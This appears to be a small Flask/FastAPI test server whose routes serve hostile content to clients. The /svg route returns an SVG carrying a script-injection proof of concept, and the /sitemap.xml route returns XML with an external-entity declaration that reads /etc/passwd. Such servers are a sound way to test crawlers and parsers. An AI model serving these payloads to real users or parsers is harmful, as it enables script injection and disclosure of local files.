from flask import Flask, Response as FlaskResponse
from fastapi import FastAPI
from starlette.middleware.wsgi import WSGIMiddleware
from fastapi.responses import Response as FastResponse

flask_app = Flask(__name__)

@flask_app.route("/")
def home():
    return "Hello, World!"

@flask_app.route("/svg")
def svg():
    svg_content = '<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>'
    return FlaskResponse(svg_content, mimetype="image/svg+xml")

app = FastAPI()
app.mount("/", WSGIMiddleware(flask_app))

@app.get("/sitemap.xml")
def sitemap():
    xml_bytes = (
        b'\xEF\xBB\xBF'
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<!DOCTYPE urlset [\n'
        b'    <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
        b']>\n'
        b'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        b'  <url>\n'
        b'    <loc>https://example.com/?abc=&xxe;</loc>\n'
        b'    <lastmod>2025-07-30</lastmod>\n'
        b'    <changefreq>daily</changefreq>\n'
        b'    <priority>1.0</priority>\n'
        b'  </url>\n'
        b'</urlset>'
    )
    return FastResponse(content=xml_bytes, media_type="application/xml")
